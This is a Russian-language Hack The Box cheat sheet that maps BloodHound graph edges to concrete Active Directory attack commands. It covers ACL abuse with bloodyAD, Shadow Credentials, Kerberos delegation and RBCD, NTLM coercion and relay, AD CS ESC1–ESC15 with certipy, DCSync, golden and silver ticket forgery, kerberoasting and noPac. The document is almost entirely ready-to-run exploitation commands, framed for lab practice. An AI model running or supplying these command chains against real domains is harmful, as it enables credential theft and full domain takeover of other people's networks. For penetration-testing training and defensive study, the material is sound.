# HTB: AD-плейбуки — от ребра BloodHound до команды

Дополняет htb-04 (разведка и базовые креды) и карту инструментов htb-07: здесь связки «что нашёл в графе/энумерации → какая команда это эксплуатирует». Синтаксис сверен с версиями тулов в образе (bloodyAD 2.5.7, certipy-ad 5.1.0, coercer 2.4.3, impacket из Kali).

## Ребро BloodHound → команда (ACL-абуз через bloodyAD)

Сначала всегда `bloodyAD -H $DC -d domain.local -u user -p pass get writable --detail` — что эта учётка может писать на самом деле, а не по слухам из графа. Цели в bloodyAD — sAMAccountName, DN или SID.

| Ребро / право | Что сделать | Команда |
|---|---|---|
| `ForceChangePassword`, `AllExtendedRights` на юзера | Сменить ему пароль | `bloodyAD ... set password victim 'NewPass123!'` |
| `AddMember`, `GenericWrite/GenericAll` на группу | Добавить себя в группу | `bloodyAD ... add groupMember 'Domain Admins' user` |
| `GenericWrite/GenericAll` на юзера | Shadow Credentials (тише смены пароля) | `bloodyAD ... add shadowCredentials victim` → сразу TGT и NT-хэш |
| `WriteSPN`, `GenericWrite` на юзера без SPN | Целевой керберостинг: поставить SPN, запросить TGS, снять SPN | `bloodyAD ... set object victim servicePrincipalName -v 'fake/victim'` → `impacket-GetUserSPNs ... -request-user victim` → очистить тем же set с пустым значением |
| `GenericWrite/GenericAll` на компьютер | RBCD (см. секцию делегирования) | `bloodyAD ... add rbcd 'WS01$' 'ATTACKER$'` |
| `WriteOwner` | Стать владельцем, потом выдать себе права | `bloodyAD ... set owner victim user`, затем `bloodyAD ... add genericAll victim user` |
| `WriteDacl` | Выдать себе нужное право напрямую | `bloodyAD ... add genericAll victim user` (на домене — `add dcsync user`) |
| `AllExtendedRights` на домен, `GetChanges+GetChangesAll` | DCSync | `impacket-secretsdump -just-dc-user krbtgt domain.local/user:pass@$DC` |
| `ReadLAPSPassword` | Прочитать LAPS | `nxc ldap $DC -u user -p pass -M laps` |
| `ReadGMSAPassword` | Прочитать gMSA | `nxc ldap $DC -u user -p pass -M gmsa` — выдаёт NT-хэш сервисной учётки |

- После любой записи результат проверять новой аутентификацией (`nxc smb`, TGT), а не выводом bloodyAD: LDAP мог принять изменение частично. Что поменял в AD — в профиль (доступ/креды): смена чужого пароля ломает исходный путь входа и переживает только до ресета машины.
- `set password` чужому без права ForceChangePassword не пройдёт; со своим старым паролем цели — `--oldpass`. Shadow Credentials пароль цели не трогает — для HTB почти всегда предпочтительнее.

## Shadow Credentials (msDS-KeyCredentialLink)

Нужен GenericWrite/GenericAll на цель и DC с PKINIT (KDC-сертификат, обычно есть при AD CS или DC 2016+ с Windows Hello). Два пути, оба в образе:

```bash
bloodyAD -H $DC -d domain.local -u user -p pass add shadowCredentials victim   # сам: ключ -> PKINIT -> TGT -> NT-хэш (UnPAC)
certipy-ad shadow auto -u user@domain.local -p pass -account victim
```

- На выходе — TGT (ccache) и NT-хэш цели: дальше PtT/PtH как обычно. Если PKINIT не поднялся («KDC has no PKINIT»/нет сертификата KDC) — вектор мёртв, откатываться на смену пароля или SPN.
- После себя ключ убирать (`bloodyAD ... remove shadowCredentials victim` / `certipy-ad shadow clear`), иначе второй заход по тому же ребру натолкнётся на свой же мусор при ресете наполовину.

## Делегирование Kerberos

```bash
nxc ldap $DC -u user -p pass -M maq          # MachineAccountQuota: сколько машинных учёток можно создать (нужно для RBCD/noPac)
```

- **Unconstrained** (компьютер/сервис с TRUSTED_FOR_DELEGATION): нужен доступ к самой машине — ждать или принудить аутентификацию привиллегированной учётки/DC на неё (coercer в обратную сторону), TGT ловить на месте (mimikatz/Rubeus на Windows-хосте). С Linux-контейнера без шелла на той машине не эксплуатируется.
- **Constrained** (`msDS-AllowedToDelegateTo`, сервис может S4U): имея пароль/хэш сервисной учётки:
  `impacket-getST domain.local/svc:pass -spn cifs/target.domain.local -impersonate Administrator -dc-ip $DC` → `export KRB5CCNAME=...ccache` → impacket с `-k -no-pass`. Protocol transition (`TRUSTED_TO_AUTH_FOR_DELEGATION`) нужен для S4U2self от любого юзера; без него работает только расширение уже делегированного билета.
- **RBCD** (пишем сами, нужно GenericWrite на целевой компьютер и своя машинная учётка):
  ```bash
  impacket-addcomputer domain.local/user:pass -computer-name 'ATTACKER$' -computer-pass 'Pass1234!' -dc-ip $DC
  bloodyAD -H $DC -d domain.local -u user -p pass add rbcd 'TARGET$' 'ATTACKER$'      # или impacket-rbcd
  impacket-getST domain.local/'ATTACKER$':'Pass1234!' -spn cifs/target.domain.local -impersonate Administrator -dc-ip $DC
  KRB5CCNAME=Administrator@cifs_target.domain.local@DOMAIN.LOCAL.ccache impacket-psexec -k -no-pass target.domain.local
  ```
  Грабли: MAQ=0 — своей машинной учётки не создать (искать существующую под контролем); делегирование не работает на учётки из Protected Users и с «account is sensitive and cannot be delegated».

## Принуждение аутентификации и NTLM-релеинг

```bash
nxc smb $TARGETS --gen-relay-list relay.txt    # цели без SMB signing
coercer scan -u user -p pass -d domain.local -t $DC        # какие методы принуждения живы (PetitPotam/PrinterBug/DFSCoerce/ShadowCoerce)
impacket-ntlmrelayx -tf relay.txt -smb2support             # SMB: сам выполнит/зальёт, или --delegate-access (RBCD), --escalate-user
impacket-ntlmrelayx -t ldap://$DC -smb2support --delegate-access
coercer coerce -u user -p pass -d domain.local -t $DC -l $TUNIP
```

- Подписывание решает всё: SMB signing required — SMB-релей мёртв; LDAP signing + channel binding (EPA) — мёртв LDAP-релей, остаётся LDAPS без EPA или AD CS ESC8. Состояние смотреть в выводе `nxc smb`/`nxc ldap` до запуска, а не по факту пустого релея.
- Релеить аутентификацию машины на неё саму нельзя (reflection-защита); DC → AD CS или DC → LDAP другого DC — можно.
- В односегментной HTB-лабе чаще всего работает связка «coercer с DC → relay в AD CS (ESC8) или LDAP с delegate-access».

## AD CS: карта ESC одной таблицей

Разведка: `certipy-ad find -u user@domain.local -p pass -dc-ip $DC -vulnerable -stdout` (или `-json`). Дальше по номеру:

| ESC | Суть | Ключевой шаг |
|---|---|---|
| ESC1 | Шаблон: Client Auth + заявитель задаёт SAN | `certipy-ad req ... -template Vuln -upn administrator@domain.local`, потом `certipy-ad auth -pfx administrator.pfx -dc-ip $DC` |
| ESC2 | Шаблон Any Purpose / без EKU | Тот же req — сертификат годится на всё |
| ESC3 | Enrollment Agent | Сначала agent-сертификат (`-template CertificateRequestAgent`), потом req от чужого имени `-on-behalf-of 'domain\administrator'` |
| ESC4 | Пишущийся ACL шаблона | `certipy-ad template ... -write-default-configuration` превращает шаблон в ESC1 (оригинал сохранить: certipy сам пишет бэкап, после атаки вернуть) |
| ESC6 | Флаг EDITF_ATTRIBUTESUBJECTALTNAME2 на CA | SAN задаётся на любом шаблоне: req с `-upn` как ESC1 |
| ESC7 | ManageCA у непривилегированного | `certipy-ad ca ... -add-officer user`, включить отключённый шаблон, одобрить свой запрос |
| ESC8 | HTTP Web Enrollment без EPA | Релей: `impacket-ntlmrelayx -t http://CA/certsrv/certfnsh.asp --adcs --template DomainController` + coercer с DC; альтернатива — `certipy-ad relay` |
| ESC9/ESC10 | Слабый маппинг сертификата на UPN | Сменить свой UPN на administrator (нужен GenericWrite на себя), получить сертификат, вернуть UPN, auth |
| ESC11 | RPC-enrollment без шифрования | Релей через RPC: `certipy-ad relay -target rpc://CA` |
| ESC13 | Шаблон с issuance policy → группа | req по шаблону, auth — членство в группе даст сам сертификат |
| ESC14 | Пишется altSecurityIdentities | Привязать свой сертификат к админу: `bloodyAD ... set object administrator altSecurityIdentities -v 'X509:<Issuer>...'` (формат подскажет certipy) |
| ESC15 | Шаблон схемы v1 (EKUwu) | req с `-application-policies 'Client Authentication'` |

- `certipy-ad auth` по pfx даёт TGT и NT-хэш (UnPAC) — хэш сразу в профиль кредом. Если KDC не отдаёт хэш (UnPAC отключён патчем), работать тикетом (`-k`).
- Имя CA для `-ca` брать из вывода find дословно (с пробелами/регистром), это частая причина «template not found».

## Билеты: PtH, OtH, PtT, подделки

```bash
impacket-getTGT domain.local/user -hashes :<NTLM> -dc-ip $DC       # overpass-the-hash: хэш -> TGT
export KRB5CCNAME=user.ccache                                       # дальше impacket-тулы с -k -no-pass (pass-the-ticket)
impacket-ticketer -nthash <krbtgt-NT> -domain-sid <SID-домена> -domain domain.local Administrator   # golden
impacket-ticketer -nthash <svc-NT> -domain-sid <SID> -domain domain.local -spn cifs/host.domain.local Administrator  # silver: KDC не участвует, работает только на этот SPN
```

- SID домена: `nxc smb $DC -u user -p pass --users` (SID юзера минус RID) или `impacket-lookupsid`.
- Golden без krbtgt невозможен (его даёт только DCSync/NTDS); silver — без DC вообще, но только на сервис, чей хэш известен. Diamond (правка легитимного TGT) — Rubeus на Windows-хосте, с Linux не делается.
- Kerberoast прицельно по одному юзеру: `impacket-GetUserSPNs ... -request-user victim`; AES-тикеты (etype 17/18) hashcat режимы 19600/19700, RC4 — 13100, AS-REP — 18200: RC4 просят понижением etype, если KDC позволяет.

## noPac (CVE-2021-42278/42287) одной проверкой

Условия: MAQ > 0 и DC без патча на смену sAMAccountName машинной учётки. Проверка без эксплуатации: `nxc smb $DC -u user -p pass -M nopac`. Цепочка при успехе: создать машинную учётку → переименовать в имя DC без `$` → TGT → вернуть имя → `impacket-getST ... -self -impersonate administrator -altservice cifs/dc.domain.local`. Zerologon сюда же по духу: только проверять (`nxc smb $DC -M zerologon` в режиме детекта), эксплуатация сбрасывает пароль машинной учётки DC и ломает домен до ручного восстановления — на HTB почти всегда есть путь чище.

## Порядок работы по графу (шпаргалка)

1. BloodHound собран (`-c All`), свой узел помечен Owned. Shortest path к Domain Admins смотреть от Owned, а не от произвольного юзера.
2. Каждое ребро пути переводить в команду из таблицы выше; ребро «HasSession» — не команда, а подсказка, где ловить креды (LSASS той машины при локальном админе на ней).
3. После каждого хопа пересобирать факты в профиль: новые креды могут открыть рёбра, которых в старом графе не было видно (граф собран под первой учёткой).
